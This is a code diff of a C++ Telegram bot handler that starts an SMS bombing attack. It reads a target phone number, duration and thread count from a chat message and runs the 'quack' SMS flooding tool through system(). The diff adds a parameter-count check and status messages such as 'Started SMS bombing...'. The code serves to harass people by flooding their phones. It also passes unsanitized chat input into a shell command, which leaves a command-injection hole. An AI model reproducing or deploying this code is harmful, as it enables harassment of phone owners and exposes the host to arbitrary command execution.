@@ -64,13 +64,22 @@ void Responses::Sms(TgBot::Bot tgbot, TgBot::Message::Ptr message){
 	Text text;
 	std::cout << "Starting smsBomber...\n";
 
-	std::string sensei = (message->text.c_str());
-	text.split(sensei, " ", "data/split.txt");
+	std::string str = (message->text.c_str());
+	text.split(str, " ", "data/split.txt");
 
 	std::vector<std::string> parameters;
 	parameters = txtToVector("data/split.txt");
 	remove("data/split.txt");
 
-    std::string command = ("quack --tool SMS --target " + parameters[1] + " --time " + parameters[2] + " --threads " + parameters[3]);
-	system(command.c_str());    
+	// If parameters are more or less than necessary than don't execute the script but output a warning
+	if(parameters.size()>4||parameters.size()<4){
+		tgbot.getApi().sendMessage(message->chat->id, "Wrong number of parameters");
+		tgbot.getApi().sendMessage(message->chat->id, "You have to use the following ones: phone number, time, threads");
+	}
+	else{
+    	std::string command = ("quack --tool SMS --target " + parameters[1] + " --time " + parameters[2] + " --threads " + parameters[3]);
+    	tgbot.getApi().sendMessage(message->chat->id, "Started SMS bombing...");
+		system(command.c_str());    
+		tgbot.getApi().sendMessage(message->chat->id, "Bombing completed");
+	}	
 }
